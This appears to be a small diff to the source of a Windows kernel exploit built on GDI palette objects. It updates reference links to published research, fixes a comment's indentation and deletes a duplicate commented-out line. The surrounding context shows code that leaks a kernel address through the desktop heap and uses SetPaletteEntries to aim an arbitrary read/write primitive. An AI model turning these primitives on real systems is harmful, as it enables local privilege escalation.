@@ -8,8 +8,9 @@
   
   	! See The Offsets....
 	
-	ref: https://labs.bluefrostsecurity.de/files/Abusing_GDI_for_ring0_exploit_primitives_Evolution_Slides.pdf
-	https://github.com/sensepost/gdi-palettes-exp/
+	ref: 
+	https://labs.bluefrostsecurity.de/files/Abusing_GDI_for_ring0_exploit_primitives_Evolution_Slides.pdf
+	https://sensepost.com/blog/2017/abusing-gdi-objects-for-ring0-primitives-revolution/
 <---- 
  
 	Copy & usage of this software are allowed without any restrictions.
@@ -223,7 +224,7 @@ LeaklpszMenuName(
 		DWORD64)(lpUserDesktopHeapWindow);
 	uintptr_t KerneltagCLS = *reinterpret_cast<DWORD64 *>((DWORD64)lpUserDesktopHeapWindow + pCLSOffset);
 
-  // notice the offset
+  	// notice the offset
 	uintptr_t lpszMenuName = *reinterpret_cast<DWORD64 *>((DWORD64)KerneltagCLS - ulClientDelta + 0x98); 
 
 	return lpszMenuName;
@@ -282,7 +283,6 @@ SetAddress(
 	HPALETTE &hpManager
 	) 
 {
-	//SetPaletteEntries(hpManager, 0x13FE, 1, (PALETTEENTRY*)&address);
 	SetPaletteEntries(hpManager, 0x13FE, 1, (PALETTEENTRY*)&address);
 }
 
